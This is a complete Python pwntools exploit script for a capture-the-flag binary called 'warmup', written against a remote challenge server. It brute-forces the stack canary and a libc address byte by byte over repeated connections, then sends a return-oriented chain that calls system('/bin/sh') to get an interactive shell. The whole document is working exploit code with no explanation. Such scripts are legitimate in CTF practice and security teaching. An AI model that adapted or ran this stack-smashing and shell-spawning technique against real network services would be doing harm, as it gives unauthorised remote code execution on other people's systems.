#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('warmup')
libc = ELF('libc.so.6')

host = args.HOST or '34.76.152.107'
port = int(args.PORT or 17012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, api=True,*a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
set follow-fork-mode child
b *main+28
b *main+552
continue
'''.format(**locals())

# -- Exploit goes here --

serv = start()

if args.GDB:
    canary = p64(int(serv.gdb.execute('info r rax',to_string=True).split()[1],16))
    libc_leak = p64(int(serv.gdb.execute('x/gx $rbp+8',to_string=True).split()[1], 16) - 0x1a)
    serv.gdb.execute("continue")
else:
    canary = b'\x00'
    libc_leak = b'\x76'

serv.recvuntil(b'will run at port ')
port_nb = int(serv.recvline())
print(port_nb)

if args.LOCAL:
    client_ip = 'localhost'
else:
    client_ip = host

OFFSET = cyclic_find(0x6161616161616168, n=8)
###############
# Find Canary #
###############

prog = log.progress('Canary')
while len(canary) != 8:
    for i in range(0x100):
        #print(hex(i))
        prog.status(f'[{len(canary)}/{8}] canary={canary.hex()} Trying {hex(i) = }')

        io = remote(client_ip,port_nb, level='error')

        p = b'A'*OFFSET
        p += canary
        p += i.to_bytes(1,'little')
        io.send(p)

        #sleep(0.2)
        
        try:
            data = io.recvuntil(b'stack smashing detected')
            io.close()

        except EOFError:
            # Might have worked
            canary += i.to_bytes(1,'little')
            io.close()
            break

prog.success(f'{canary = }')

###############
# Brute libc  #
###############

prog = log.progress('Libc')
while len(libc_leak) < 6:
    for i in range(0x100):
        #print(hex(i))
        prog.status(f'[{len(libc_leak)}/{6}] libc_leak={libc_leak.hex()} Trying {hex(i) = }')

        io = remote(client_ip,port_nb, level='error')

        p = b'A'*OFFSET
        p += canary
        p += p64(0xc0febabe) # RBP
        p += libc_leak
        p += i.to_bytes(1,'little')
        io.send(p)
        
        try:
            data = io.recvuntil(b'This is helper for you')
            libc_leak += i.to_bytes(1,'little')
            io.close()
            break

        except EOFError:
            io.close()

libc_leak = u64(libc_leak.ljust(8, b'\0'))
prog.success(f'{libc_leak = :x}')


libc.address = libc_leak - 0x23a76

log.success(f'{libc.address = }')

###############
# Get shell   #
###############

io = remote(client_ip,port_nb, level='error')

rop = ROP([libc])
rop.raw(rop.ret)
rop.rdi = next(libc.search(b'/bin/sh\0'))
rop.system()

p = b'A'*OFFSET
p += canary
p += p64(0xc0febabe) # RBP
p += rop.chain()

io.send(p)
io.interactive()